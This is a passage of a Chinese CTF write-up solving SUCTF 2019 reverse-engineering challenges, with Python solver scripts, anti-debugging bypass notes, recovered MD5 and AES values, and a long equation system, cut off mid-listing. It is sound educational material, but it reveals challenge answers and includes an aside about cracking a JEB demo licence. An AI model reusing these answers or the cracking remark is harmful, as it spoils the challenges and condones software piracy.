+            tmp=(((a % 7) + j) % 256) ^ (((3 * (18 ^ a)) + 2) % 256)
+            if ( tmp== hexData[i]):
+                a=j
+                flag+=chr(a)
+                break
+    print flag
+    
+
+###  Akira HomeWork
+
+首先程序有几处IsDebuggerPresent()的反调试需要注意，而且程序的输入函数是有bug的，运行就会崩溃。所以要绕过该call，手动在内存中输入数据。
+
+第一关：
+
+简单的字符串异或变换
+
+    
+    
+    data=[0x41,0x6A,0x6B,0x71,0x65,0x5A,0x67,0x72,0x7C,0x39,0x55,0x68,0x64,0x3E,0x7D,0x7C,0x4F,0x30,]
+    first=''
+    for i in range(18):
+        first += chr(data[i]^i)
+    print first
+    
+
+第二关：
+
+会读取一个文件，这里同样绕过call，手动在内存输入数据。最终加密后会与
+
+    
+    
+    FCAEEB6E34B4303E99B91206BD325F2B
+    
+
+比较，其实就是md5加密，对应明文为“Overwatch”。
+
+第三关：
+
+程序会对内存中的某段数据进行三次解密运算操作
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/re2.png?raw=true)
+
+三处解密代码运行在不同时机，作用于同一个内存数据。必须前两关输入的内容正确才能正常触发，其中第二处解密代码不会被执行，导致最终dump出的数据未被完全还原。
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/re2-2.png?raw=true)
+
+并且异或的值也未知，但看出这段数据像PE文件，不难写出解密代码
+
+    
+    
+    for i in range(0x4c00):
+        if (i % 3 == 1):
+            hexData[i] ^= 0x59
+    for i in range(0x4c00):
+        print "%02X"%(hexData[i]),
+    
+
+此时得到的数据便是一个DLL文件
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/re2-3.png?raw=true)
+
+该dll会读取共享内存，并进行AES解密运算，密钥为“Ak1i3aS3cre7K3y”。
+
+而共享数据则在原来的exe中
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/re2-4.png?raw=true)
+
+所以AES密文为
+
+    
+    
+    94 BF 7A 0C A4 35 50 D1 C2 15 EC EF 9D 9A AA 56
+    
+
+最后解密即可！
+
+###  babyunic
+
+程序使用unicorn模拟执行二进制文件func
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/re3.png?raw=true)
+
+func为mips指令集大端模式，使用jeb-mips反编译效果如下（demo版本只能看，不能复制，气不气？打完比赛之后第一件事就是把jeb破掉。。。）
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/re3-2.png?raw=true)
+
+func调用完成将结果与内存区域的数据进行比较，相等则验证通过
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/re3-3.png?raw=true)
+
+将其翻译成python脚本如下
+
+    
+    
+    #你的输入
+    input='your input'
+    #正确加密结果
+    enFlag=[-108,-200,294,-216,-1008,660,-866,1770,220,6,-244,-522,-1406,-816,386,990,334,690,-1832,372,
+    -1370,-1580,450,-1668,858,326,-196,-1516,462,2012,-696,152,2142,-592,-68,878,
+    -178,-1994,1472,1710,1684,34]
+    #加密运算
+    for i in range(len(input)):
+        v2=input[i]
+        v3=v2>>5 | (v2<<3)%256
+        print v3
+        input[i]=v3^i
+    enFlag[0] = ( (input[1])) + ( (input[2])) + ( input[0]) - ( (input[3])) + ( (input[4])) - ( (input[5])) - ( (input[6])) - ( (input[7])) - ( (input[8])) + ( (input[9])) + ( (input[10])) - ( (input[11])) + ( (input[12])) - ( (input[13])) - ( (input[14])) + ( (input[15])) - ( (input[16])) - ( (input[17])) + ( (input[18])) + ( (input[19])) - ( (input[20])) + ( (input[21])) + (( (input[22])) + ( (input[23]))) + ( (input[24])) - ( (input[25])) + ( (input[26])) - ( (input[27])) + ( (input[28])) + ( (input[29])) - ( (input[30])) - ( (input[31])) + ( (input[32])) - ( (input[33])) + ( (input[34])) + ( (input[35])) - ( (input[36])) - ( (input[37])) + ( (input[38])) - ( (input[39])) + ( (input[40])) + ( (input[41]));
+    enFlag[1] = ( input[0]) - ( (input[1])) + ( (input[2])) - ( (input[3])) - ( (input[4])) + ( (input[5])) - ( (input[6])) - ( (input[7])) - ( (input[8])) - ( (input[9])) + ( (input[10])) - ( (input[11])) + ( (input[12])) - ( (input[13])) - ( (input[14])) + ( (input[15])) - ( (input[16])) - ( (input[17])) + ( (input[18])) - ( (input[19])) + ( (input[20])) + ( (input[21])) - ( (input[22])) - ( (input[23])) - ( (input[24])) + ( (input[25])) - ( (input[26])) + ( (input[27])) - ( (input[28])) - ( (input[29])) + ( (input[30])) + (( (input[31])) + ( (input[32]))) + (( (input[33])) + ( (input[34])) + ( (input[35]))) - ( (input[36])) - ( (input[37])) - ( (input[38])) - ( (input[39])) - ( (input[40])) + ( (input[41]));
+    enFlag[2] = ( input[0]) - ( (input[1])) + ( (input[2])) + ( (input[3])) - ( (input[4])) + ( (input[5])) - ( (input[6])) - ( (input[7])) + ( (input[8])) - ( (input[9])) - ( (input[10])) - ( (input[11])) - ( (input[12])) - ( (input[13])) + ( (input[14])) - ( (input[15])) - ( (input[16])) + ( (input[17])) + (( (input[18])) + ( (input[19]))) + (( (input[20])) + ( (input[21]))) - ( (input[22])) + ( (input[23])) + (( (input[24])) + ( (input[25]))) + ( (input[26])) - ( (input[27])) + ( (input[28])) - ( (input[29])) + ( (input[30])) - ( (input[31])) + ( (input[32])) + ( (input[33])) - ( (input[34])) - ( (input[35])) + ( (input[36])) + (( (input[37])) + ( (input[38]))) - ( (input[39])) + ( (input[40])) - ( (input[41]));
+    enFlag[3] = ( input[0]) - ( (input[1])) - ( (input[2])) - ( (input[3])) - ( (input[4])) - ( (input[5])) + ( (input[6])) + ( (input[7])) - ( (input[8])) - ( (input[9])) - ( (input[10])) - ( (input[11])) + ( (input[12])) - ( (input[13])) + ( (input[14])) - ( (input[15])) + ( (input[16])) - ( (input[17])) + ( (input[18])) + (( (input[19])) + ( (input[20]))) - ( (input[21])) + ( (input[22])) + (( (input[23])) + ( (input[24]))) - ( (input[25])) - ( (input[26])) + ( (input[27])) - ( (input[28])) + ( (input[29])) + ( (input[30])) - ( (input[31])) - ( (input[32])) - ( (input[33])) + ( (input[34])) - ( (input[35])) + ( (input[36])) + (( (input[37])) + ( (input[38]))) - ( (input[39])) + ( (input[40])) + ( (input[41]));
+    enFlag[4] = ( input[0]) - ( (input[1])) - ( (input[2])) + ( (input[3])) - ( (input[4])) - ( (input[5])) + ( (input[6])) + (( (input[7])) + ( (input[8]))) + ( (input[9])) - ( (input[10])) + ( (input[11])) + ( (input[12])) - ( (input[13])) + ( (input[14])) - ( (input[15])) + ( (input[16])) + ( (input[17])) - ( (input[18])) + ( (input[19])) - ( (input[20])) + ( (input[21])) - ( (input[22])) - ( (input[23])) - ( (input[24])) + ( (input[25])) - ( (input[26])) - ( (input[27])) - ( (input[28])) + ( (input[29])) + (( (input[30])) + ( (input[31]))) - ( (input[32])) + ( (input[33])) - ( (input[34])) - ( (input[35])) + ( (input[36])) - ( (input[37])) + ( (input[38])) - ( (input[39])) - ( (input[40])) - ( (input[41]));
+    enFlag[5] = ( (input[1])) + ( (input[2])) + (( (input[3])) + ( (input[4]))) + (( (input[5])) + ( (input[6])) + (( (input[7])) + ( (input[8])))) + ( input[0]) - ( (input[9])) - ( (input[10])) - ( (input[11])) - ( (input[12])) - ( (input[13])) - ( (input[14])) + ( (input[15])) - ( (input[16])) + ( (input[17])) - ( (input[18])) + ( (input[19])) + ( (input[20])) - ( (input[21])) + ( (input[22])) - ( (input[23])) + ( (input[24])) - ( (input[25])) + ( (input[26])) + ( (input[27])) - ( (input[28])) + ( (input[29])) - ( (input[30])) + ( (input[31])) + (( (input[32])) + ( (input[33]))) - ( (input[34])) - ( (input[35])) - ( (input[36])) + ( (input[37])) - ( (input[38])) - ( (input[39])) + ( (input[40])) + ( (input[41]));
+    enFlag[6] = ( input[0]) - ( (input[1])) + ( (input[2])) + (( (input[3])) + ( (input[4]))) - ( (input[5])) + ( (input[6])) + (( (input[7])) + ( (input[8]))) + ( (input[9])) - ( (input[10])) + ( (input[11])) + ( (input[12])) - ( (input[13])) + ( (input[14])) + (( (input[15])) + ( (input[16]))) + ( (input[17])) - ( (input[18])) - ( (input[19])) - ( (input[20])) - ( (input[21])) - ( (input[22])) - ( (input[23])) + ( (input[24])) + ( (input[25])) - ( (input[26])) + ( (input[27])) + (( (input[28])) + ( (input[29]))) - ( (input[30])) - ( (input[31])) - ( (input[32])) - ( (input[33])) - ( (input[34])) - ( (input[35])) + ( (input[36])) + ( (input[37])) - ( (input[38])) - ( (input[39])) + ( (input[40])) - ( (input[41]));
+    enFlag[7] = ( (input[1])) + ( input[0]) - ( (input[2])) - ( (input[3])) - ( (input[4])) + ( (input[5])) + ( (input[6])) - ( (input[7])) + ( (input[8])) + ( (input[9])) - ( (input[10])) + ( (input[11])) - ( (input[12])) + ( (input[13])) - ( (input[14])) + ( (input[15])) - ( (input[16])) + ( (input[17])) - ( (input[18])) - ( (input[19])) + ( (input[20])) - ( (input[21])) + ( (input[22])) - ( (input[23])) - ( (input[24])) + ( (input[25])) - ( (input[26])) + ( (input[27])) + (( (input[28])) + ( (input[29]))) + (( (input[30])) + ( (input[31])) + ( (input[32]))) - ( (input[33])) + ( (input[34])) - ( (input[35])) + ( (input[36])) + (( (input[37])) + ( (input[38]))) + ( (input[39])) - ( (input[40])) - ( (input[41]));
+    enFlag[8] = ( input[0]) - ( (input[1])) - ( (input[2])) + ( (input[3])) + ( (input[4])) - ( (input[5])) + ( (input[6])) + (( (input[7])) + ( (input[8]))) + (( (input[9])) + ( (input[10]))) - ( (input[11])) - ( (input[12])) + ( (input[13])) - ( (input[14])) + ( (input[15])) + (( (input[16])) + ( (input[17]))) + ( (input[18])) - ( (input[19])) + ( (input[20])) + ( (input[21])) - ( (input[22])) - ( (input[23])) + ( (input[24])) + (( (input[25])) + ( (input[26]))) - ( (input[27])) + ( (input[28])) - ( (input[29])) - ( (input[30])) - ( (input[31])) - ( (input[32])) - ( (input[33])) + ( (input[34])) - ( (input[35])) - ( (input[36])) + ( (input[37])) - ( (input[38])) - ( (input[39])) + ( (input[40])) - ( (input[41]));
+    enFlag[9] = ( (input[1])) + ( (input[2])) + ( input[0]) - ( (input[3])) + ( (input[4])) + (( (input[5])) + ( (input[6]))) - ( (input[7])) - ( (input[8])) - ( (input[9])) - ( (input[10])) + ( (input[11])) + (( (input[12])) + ( (input[13]))) - ( (input[14])) + ( (input[15])) + ( (input[16])) - ( (input[17])) - ( (input[18])) + ( (input[19])) + ( (input[20])) - ( (input[21])) - ( (input[22])) - ( (input[23])) + ( (input[24])) - ( (input[25])) - ( (input[26])) - ( (input[27])) + ( (input[28])) + (( (input[29])) + ( (input[30]))) - ( (input[31])) + ( (input[32])) + ( (input[33])) - ( (input[34])) - ( (input[35])) - ( (input[36])) - ( (input[37])) + ( (input[38])) - ( (input[39])) + ( (input[40])) + ( (input[41]));
+    enFlag[10] = ( input[0]) - ( (input[1])) + ( (input[2])) + ( (input[3])) - ( (input[4])) - ( (input[5])) + ( (input[6])) + ( (input[7])) - ( (input[8])) - ( (input[9])) - ( (input[10])) - ( (input[11])) + ( (input[12])) + (( (input[13])) + ( (input[14]))) - ( (input[15])) + ( (input[16])) - ( (input[17])) + ( (input[18])) + (( (input[19])) + ( (input[20]))) - ( (input[21])) + ( (input[22])) - ( (input[23])) - ( (input[24])) - ( (input[25])) + ( (input[26])) - ( (input[27])) - ( (input[28])) + ( (input[29])) - ( (input[30])) + ( (input[31])) + ( (input[32])) - ( (input[33])) - ( (input[34])) + ( (input[35])) - ( (input[36])) - ( (input[37])) + ( (input[38])) - ( (input[39])) + ( (input[40])) + ( (input[41]));
+    enFlag[11] = ( input[0]) - ( (input[1])) + ( (input[2])) + (( (input[3])) + ( (input[4]))) - ( (input[5])) + ( (input[6])) + ( (input[7])) - ( (input[8])) + ( (input[9])) + ( (input[10])) - ( (input[11])) - ( (input[12])) - ( (input[13])) - ( (input[14])) + ( (input[15])) - ( (input[16])) - ( (input[17])) - ( (input[18])) + ( (input[19])) + ( (input[20])) - ( (input[21])) + ( (input[22])) - ( (input[23])) + ( (input[24])) + (( (input[25])) + ( (input[26]))) + ( (input[27])) - ( (input[28])) + ( (input[29])) + ( (input[30])) - ( (input[31])) - ( (input[32])) - ( (input[33])) - ( (input[34])) - ( (input[35])) + ( (input[36])) + ( (input[37])) - ( (input[38])) - ( (input[39])) - ( (input[40])) - ( (input[41]));
+    enFlag[12] = ( input[0]) - ( (input[1])) - ( (input[2])) - ( (input[3])) + ( (input[4])) - ( (input[5])) - ( (input[6])) + ( (input[7])) + ( (input[8])) - ( (input[9])) + ( (input[10])) - ( (input[11])) - ( (input[12])) - ( (input[13])) + ( (input[14])) - ( (input[15])) + ( (input[16])) - ( (input[17])) + ( (input[18])) - ( (input[19])) - ( (input[20])) - ( (input[21])) - ( (input[22])) + ( (input[23])) - ( (input[24])) + ( (input[25])) - ( (input[26])) + ( (input[27])) - ( (input[28])) + ( (input[29])) - ( (input[30])) - ( (input[31])) + ( (input[32])) + (( (input[33])) + ( (input[34]))) - ( (input[35])) - ( (input[36])) - ( (input[37])) - ( (input[38])) + ( (input[39])) - ( (input[40])) - ( (input[41]));
+    enFlag[13] = ( input[0]) - ( (input[1])) + ( (input[2])) - ( (input[3])) + ( (input[4])) - ( (input[5])) + ( (input[6])) - ( (input[7])) + ( (input[8])) - ( (input[9])) + ( (input[10])) - ( (input[11])) + ( (input[12])) + (( (input[13])) + ( (input[14]))) + ( (input[15])) - ( (input[16])) - ( (input[17])) - ( (input[18])) + ( (input[19])) + (( (input[20])) + ( (input[21]))) - ( (input[22])) - ( (input[23])) + ( (input[24])) + ( (input[25])) - ( (input[26])) - ( (input[27])) + ( (input[28])) + ( (input[29])) - ( (input[30])) - ( (input[31])) - ( (input[32])) + ( (input[33])) - ( (input[34])) - ( (input[35])) + ( (input[36])) - ( (input[37])) - ( (input[38])) - ( (input[39])) + ( (input[40])) - ( (input[41]));
+    enFlag[14] = ( (input[1])) + ( (input[2])) + ( input[0]) - ( (input[3])) - ( (input[4])) - ( (input[5])) + ( (input[6])) - ( (input[7])) + ( (input[8])) + (( (input[9])) + ( (input[10]))) - ( (input[11])) + ( (input[12])) - ( (input[13])) - ( (input[14])) + ( (input[15])) + (( (input[16])) + ( (input[17]))) - ( (input[18])) - ( (input[19])) - ( (input[20])) - ( (input[21])) + ( (input[22])) + (( (input[23])) + ( (input[24]))) - ( (input[25])) + ( (input[26])) + (( (input[27])) + ( (input[28]))) - ( (input[29])) - ( (input[30])) - ( (input[31])) + ( (input[32])) + (( (input[33])) + ( (input[34]))) + (( (input[35])) + ( (input[36])) + (( (input[37])) + ( (input[38])))) - ( (input[39])) - ( (input[40])) - ( (input[41]));
+    enFlag[15] = ( input[0]) - ( (input[1])) + ( (input[2])) + (( (input[3])) + ( (input[4]))) + ( (input[5])) - ( (input[6])) + ( (input[7])) - ( (input[8])) - ( (input[9])) - ( (input[10])) + ( (input[11])) + (( (input[12])) + ( (input[13]))) - ( (input[14])) - ( (input[15])) - ( (input[16])) + ( (input[17])) - ( (input[18])) - ( (input[19])) - ( (input[20])) - ( (input[21])) + ( (input[22])) + (( (input[23])) + ( (input[24]))) + (( (input[25])) + ( (input[26])) + ( (input[27]))) - ( (input[28])) - ( (input[29])) - ( (input[30])) - ( (input[31])) + ( (input[32])) - ( (input[33])) + ( (input[34])) + (( (input[35])) + ( (input[36]))) + ( (input[37])) - ( (input[38])) + ( (input[39])) + ( (input[40])) - ( (input[41]));
+    enFlag[16] = ( input[0]) - ( (input[1])) + ( (input[2])) + ( (input[3])) - ( (input[4])) - ( (input[5])) + ( (input[6])) + (( (input[7])) + ( (input[8]))) + (( (input[9])) + ( (input[10]))) - ( (input[11])) + ( (input[12])) - ( (input[13])) + ( (input[14])) + (( (input[15])) + ( (input[16]))) - ( (input[17])) + ( (input[18])) - ( (input[19])) + ( (input[20])) - ( (input[21])) - ( (input[22])) - ( (input[23])) - ( (input[24])) - ( (input[25])) + ( (input[26])) + (( (input[27])) + ( (input[28]))) + ( (input[29])) - ( (input[30])) - ( (input[31])) + ( (input[32])) - ( (input[33])) - ( (input[34])) + ( (input[35])) - ( (input[36])) + ( (input[37])) - ( (input[38])) + ( (input[39])) - ( (input[40])) + ( (input[41]));
+    enFlag[17] = ( (input[1])) + ( (input[2])) + (( (input[3])) + ( (input[4]))) + ( input[0]) - ( (input[5])) + ( (input[6])) + (( (input[7])) + ( (input[8]))) - ( (input[9])) - ( (input[10])) + ( (input[11])) - ( (input[12])) + ( (input[13])) + (( (input[14])) + ( (input[15]))) - ( (input[16])) + ( (input[17])) - ( (input[18])) - ( (input[19])) + ( (input[20])) - ( (input[21])) + ( (input[22])) - ( (input[23])) - ( (input[24])) + ( (input[25])) - ( (input[26])) + ( (input[27])) - ( (input[28])) + ( (input[29])) - ( (input[30])) - ( (input[31])) + ( (input[32])) - ( (input[33])) - ( (input[34])) + ( (input[35])) - ( (input[36])) + ( (input[37])) - ( (input[38])) + ( (input[39])) + ( (input[40])) - ( (input[41]));
+    enFlag[18] = ( input[0]) - ( (input[1])) - ( (input[2])) - ( (input[3])) + ( (input[4])) + ( (input[5])) - ( (input[6])) + ( (input[7])) - ( (input[8])) + ( (input[9])) + ( (input[10])) - ( (input[11])) - ( (input[12])) - ( (input[13])) + ( (input[14])) - ( (input[15])) - ( (input[16])) + ( (input[17])) + (( (input[18])) + ( (input[19]))) - ( (input[20])) - ( (input[21])) - ( (input[22])) - ( (input[23])) - ( (input[24])) - ( (input[25])) - ( (input[26])) - ( (input[27])) + ( (input[28])) + (( (input[29])) + ( (input[30]))) - ( (input[31])) - ( (input[32])) - ( (input[33])) + ( (input[34])) - ( (input[35])) - ( (input[36])) - ( (input[37])) - ( (input[38])) - ( (input[39])) - ( (input[40])) + ( (input[41]));
+    enFlag[19] = ( (input[1])) + ( (input[2])) + (( (input[3])) + ( input[0])) - ( (input[4])) - ( (input[5])) + ( (input[6])) - ( (input[7])) - ( (input[8])) - ( (input[9])) - ( (input[10])) - ( (input[11])) - ( (input[12])) - ( (input[13])) + ( (input[14])) + (( (input[15])) + ( (input[16]))) - ( (input[17])) + ( (input[18])) + (( (input[19])) + ( (input[20]))) + ( (input[21])) - ( (input[22])) + ( (input[23])) + ( (input[24])) - ( (input[25])) + ( (input[26])) + ( (input[27])) - ( (input[28])) + ( (input[29])) + (( (input[30])) + ( (input[31]))) + (( (input[32])) + ( (input[33]))) - ( (input[34])) + ( (input[35])) - ( (input[36])) - ( (input[37])) - ( (input[38])) + ( (input[39])) + ( (input[40])) - ( (input[41]));
+    enFlag[20] = ( (input[1])) + ( input[0]) - ( (input[2])) - ( (input[3])) - ( (input[4])) + ( (input[5])) - ( (input[6])) + ( (input[7])) - ( (input[8])) - ( (input[9])) + ( (input[10])) + ( (input[11])) - ( (input[12])) - ( (input[13])) + ( (input[14])) - ( (input[15])) - ( (input[16])) + ( (input[17])) - ( (input[18])) - ( (input[19])) + ( (input[20])) + ( (input[21])) - ( (input[22])) + ( (input[23])) + ( (input[24])) - ( (input[25])) - ( (input[26])) - ( (input[27])) - ( (input[28])) - ( (input[29])) - ( (input[30])) - ( (input[31])) - ( (input[32])) + ( (input[33])) - ( (input[34])) + ( (input[35])) + ( (input[36])) - ( (input[37])) + ( (input[38])) - ( (input[39])) + ( (input[40])) - ( (input[41]));
+    enFlag[21] = ( input[0]) - ( (input[1])) - ( (input[2])) - ( (input[3])) + ( (input[4])) + (( (input[5])) + ( (input[6]))) + ( (input[7])) - ( (input[8])) - ( (input[9])) - ( (input[10])) - ( (input[11])) - ( (input[12])) - ( (input[13])) - ( (input[14])) - ( (input[15])) - ( (input[16])) + ( (input[17])) - ( (input[18])) - ( (input[19])) + ( (input[20])) - ( (input[21])) + ( (input[22])) + (( (input[23])) + ( (input[24]))) - ( (input[25])) - ( (input[26])) + ( (input[27])) - ( (input[28])) - ( (input[29])) - ( (input[30])) - ( (input[31])) - ( (input[32])) - ( (input[33])) - ( (input[34])) - ( (input[35])) - ( (input[36])) + ( (input[37])) - ( (input[38])) - ( (input[39])) - ( (input[40])) + ( (input[41]));
+    enFlag[22] = ( (input[1])) + ( (input[2])) + (( (input[3])) + ( (input[4]))) + (( (input[5])) + ( (input[6])) + (( (input[7])) + ( input[0]))) - ( (input[8])) + ( (input[9])) - ( (input[10])) + ( (input[11])) - ( (input[12])) + ( (input[13])) + (( (input[14])) + ( (input[15]))) - ( (input[16])) + ( (input[17])) + ( (input[18])) - ( (input[19])) - ( (input[20])) + ( (input[21])) + ( (input[22])) - ( (input[23])) + ( (input[24])) - ( (input[25])) - ( (input[26])) + ( (input[27])) - ( (input[28])) + ( (input[29])) + (( (input[30])) + ( (input[31]))) - ( (input[32])) + ( (input[33])) - ( (input[34])) - ( (input[35])) - ( (input[36])) - ( (input[37])) + ( (input[38])) - ( (input[39])) + ( (input[40])) + ( (input[41]));
+    enFlag[23] = ( input[0]) - ( (input[1])) + ( (input[2])) + ( (input[3])) - ( (input[4])) - ( (input[5])) - ( (input[6])) - ( (input[7])) + ( (input[8])) - ( (input[9])) - ( (input[10])) + ( (input[11])) + ( (input[12])) - ( (input[13])) - ( (input[14])) + ( (input[15])) - ( (input[16])) - ( (input[17])) + ( (input[18])) + ( (input[19])) - ( (input[20])) - ( (input[21])) + ( (input[22])) - ( (input[23])) + ( (input[24])) + ( (input[25])) - ( (input[26])) + ( (input[27])) - ( (input[28])) + ( (input[29])) + ( (input[30])) - ( (input[31])) - ( (input[32])) - ( (input[33])) - ( (input[34])) - ( (input[35])) - ( (input[36])) - ( (input[37])) + ( (input[38])) - ( (input[39])) - ( (input[40])) - ( (input[41]));
+    enFlag[24] = ( (input[1])) + ( input[0]) - ( (input[2])) + ( (input[3])) + ( (input[4])) - ( (input[5])) + ( (input[6])) + ( (input[7])) - ( (input[8])) + ( (input[9])) + ( (input[10])) - ( (input[11])) - ( (input[12])) - ( (input[13])) - ( (input[14])) + ( (input[15])) + (( (input[16])) + ( (input[17]))) - ( (input[18])) + ( (input[19])) + (( (input[20])) + ( (input[21]))) + (( (input[22])) + ( (input[23])) + (( (input[24])) + ( (input[25])))) - ( (input[26])) - ( (input[27])) - ( (input[28])) + ( (input[29])) + ( (input[30])) - ( (input[31])) + ( (input[32])) + (( (input[33])) + ( (input[34]))) - ( (input[35])) - ( (input[36])) - ( (input[37])) - ( (input[38])) + ( (input[39])) + ( (input[40])) - ( (input[41]));
+    enFlag[25] = ( input[0]) - ( (input[1])) + ( (input[2])) + ( (input[3])) - ( (input[4])) + ( (input[5])) + ( (input[6])) - ( (input[7])) + ( (input[8])) + (( (input[9])) + ( (input[10]))) - ( (input[11])) - ( (input[12])) + ( (input[13])) - ( (input[14])) + ( (input[15])) - ( (input[16])) + ( (input[17])) + (( (input[18])) + ( (input[19]))) - ( (input[20])) - ( (input[21])) + ( (input[22])) + ( (input[23])) - ( (input[24])) - ( (input[25])) + ( (input[26])) - ( (input[27])) + ( (input[28])) - ( (input[29])) + ( (input[30])) - ( (input[31])) - ( (input[32])) + ( (input[33])) - ( (input[34])) - ( (input[35])) - ( (input[36])) - ( (input[37])) + ( (input[38])) - ( (input[39])) + ( (input[40])) + ( (input[41]));
+    enFlag[26] = ( (input[1])) + ( (input[2])) + (( (input[3])) + ( (input[4]))) + ( input[0]) - ( (input[5])) - ( (input[6])) + ( (input[7])) - ( (input[8])) - ( (input[9])) - ( (input[10])) - ( (input[11])) + ( (input[12])) - ( (input[13])) + ( (input[14])) - ( (input[15])) + ( (input[16])) - ( (input[17])) + ( (input[18])) - ( (input[19])) - ( (input[20])) + ( (input[21])) + (( (input[22])) + ( (input[23]))) + (( (input[24])) + ( (input[25]))) - ( (input[26])) - ( (input[27])) - ( (input[28])) - ( (input[29])) + ( (input[30])) + ( (input[31])) - ( (input[32])) - ( (input[33])) - ( (input[34])) + ( (input[35])) + ( (input[36])) - ( (input[37])) - ( (input[38])) + ( (input[39])) + (( (input[40])) + ( (input[41])));
+    enFlag[27] = ( input[0]) - ( (input[1])) + ( (input[2])) - ( (input[3])) + ( (input[4])) - ( (input[5])) - ( (input[6])) - ( (input[7])) - ( (input[8])) - ( (input[9])) - ( (input[10])) - ( (input[11])) + ( (input[12])) + ( (input[13])) - ( (input[14])) + ( (input[15])) + (( (input[16])) + ( (input[17]))) + (( (input[18])) + ( (input[19]))) - ( (input[20])) - ( (input[21])) - ( (input[22])) - ( (input[23])) + ( (input[24])) + (( (input[25])) + ( (input[26]))) - ( (input[27])) + ( (input[28])) + (( (input[29])) + ( (input[30]))) - ( (input[31])) - ( (input[32])) - ( (input[33])) - ( (input[34])) + ( (input[35])) - ( (input[36])) - ( (input[37])) - ( (input[38])) - ( (input[39])) - ( (input[40])) - ( (input[41]));
+    enFlag[28] = ( input[0]) - ( (input[1])) + ( (input[2])) + (( (input[3])) + ( (input[4]))) - ( (input[5])) + ( (input[6])) + ( (input[7])) - ( (input[8])) - ( (input[9])) + ( (input[10])) + ( (input[11])) - ( (input[12])) + ( (input[13])) - ( (input[14])) + ( (input[15])) - ( (input[16])) + ( (input[17])) + (( (input[18])) + ( (input[19]))) - ( (input[20])) - ( (input[21])) + ( (input[22])) - ( (input[23])) - ( (input[24])) - ( (input[25])) - ( (input[26])) + ( (input[27])) - ( (input[28])) - ( (input[29])) - ( (input[30])) + ( (input[31])) - ( (input[32])) - ( (input[33])) + ( (input[34])) + (( (input[35])) + ( (input[36]))) - ( (input[37])) - ( (input[38])) + ( (input[39])) + (( (input[40])) + ( (input[41])));
+    enFlag[29] = ( (input[1])) + ( input[0]) - ( (input[2])) - ( (input[3])) - ( (input[4])) + ( (input[5])) + (( (input[6])) + ( (input[7]))) - ( (input[8])) + ( (input[9])) - ( (input[10])) - ( (input[11])) + ( (input[12])) - ( (input[13])) + ( (input[14])) + ( (input[15])) - ( (input[16])) + ( (input[17])) + ( (input[18])) - ( (input[19])) + ( (input[20])) + (( (input[21])) + ( (input[22]))) + ( (input[23])) - ( (input[24])) + ( (input[25])) + ( (input[26])) - ( (input[27])) + ( (input[28])) + (( (input[29])) + ( (input[30]))) + (( (input[31])) + ( (input[32]))) - ( (input[33])) - ( (input[34])) + ( (input[35])) + ( (input[36])) - ( (input[37])) + ( (input[38])) + ( (input[39])) - ( (input[40])) + ( (input[41]));
+    enFlag[30] = ( (input[1])) + ( (input[2])) + (( (input[3])) + ( input[0])) - ( (input[4])) - ( (input[5])) - ( (input[6])) - ( (input[7])) + ( (input[8])) + ( (input[9])) - ( (input[10])) - ( (input[11])) - ( (input[12])) + ( (input[13])) - ( (input[14])) - ( (input[15])) + ( (input[16])) - ( (input[17])) - ( (input[18])) - ( (input[19])) + ( (input[20])) - ( (input[21])) - ( (input[22])) + ( (input[23])) + ( (input[24])) - ( (input[25])) - ( (input[26])) + ( (input[27])) - ( (input[28])) - ( (input[29])) - ( (input[30])) - ( (input[31])) - ( (input[32])) - ( (input[33])) - ( (input[34])) + ( (input[35])) + (( (input[36])) + ( (input[37]))) - ( (input[38])) + ( (input[39])) + (( (input[40])) + ( (input[41])));
+    enFlag[31] = ( (input[1])) + ( input[0]) - ( (input[2])) + ( (input[3])) + ( (input[4])) - ( (input[5])) - ( (input[6])) + ( (input[7])) + (( (input[8])) + ( (input[9]))) + (( (input[10])) + ( (input[11])) + ( (input[12]))) - ( (input[13])) - ( (input[14])) - ( (input[15])) + ( (input[16])) + (( (input[17])) + ( (input[18]))) + ( (input[19])) - ( (input[20])) + ( (input[21])) - ( (input[22])) + ( (input[23])) - ( (input[24])) - ( (input[25])) + ( (input[26])) + ( (input[27])) - ( (input[28])) + ( (input[29])) - ( (input[30])) - ( (input[31])) - ( (input[32])) + ( (input[33])) - ( (input[34])) + ( (input[35])) - ( (input[36])) + ( (input[37])) - ( (input[38])) + ( (input[39])) - ( (input[40])) - ( (input[41]));
+    enFlag[32] = ( input[0]) - ( (input[1])) + ( (input[2])) + ( (input[3])) - ( (input[4])) + ( (input[5])) + (( (input[6])) + ( (input[7]))) + ( (input[8])) - ( (input[9])) + ( (input[10])) + ( (input[11])) - ( (input[12])) + ( (input[13])) + ( (input[14])) - ( (input[15])) + ( (input[16])) - ( (input[17])) + ( (input[18])) + (( (input[19])) + ( (input[20]))) - ( (input[21])) - ( (input[22])) + ( (input[23])) - ( (input[24])) + ( (input[25])) + (( (input[26])) + ( (input[27]))) - ( (input[28])) - ( (input[29])) - ( (input[30])) - ( (input[31])) - ( (input[32])) - ( (input[33])) + ( (input[34])) + (( (input[35])) + ( (input[36]))) + ( (input[37])) - ( (input[38])) + ( (input[39])) - ( (input[40])) + ( (input[41]));
+    enFlag[33] = ( input[0]) - ( (input[1])) - ( (input[2])) + ( (input[3])) + (( (input[4])) + ( (input[5]))) + ( (input[6])) - ( (input[7])) - ( (input[8])) + ( (input[9])) + (( (input[10])) + ( (input[11]))) - ( (input[12])) - ( (input[13])) + ( (input[14])) + ( (input[15])) - ( (input[16])) + ( (input[17])) - ( (input[18])) + ( (input[19])) - ( (input[20])) + ( (input[21])) + (( (input[22])) + ( (input[23]))) - ( (input[24])) - ( (input[25])) + ( (input[26])) + ( (input[27])) - ( (input[28])) + ( (input[29])) - ( (input[30])) - ( (input[31])) - ( (input[32])) - ( (input[33])) - ( (input[34])) - ( (input[35])) + ( (input[36])) - ( (input[37])) + ( (input[38])) - ( (input[39])) - ( (input[40])) - ( (input[41]));
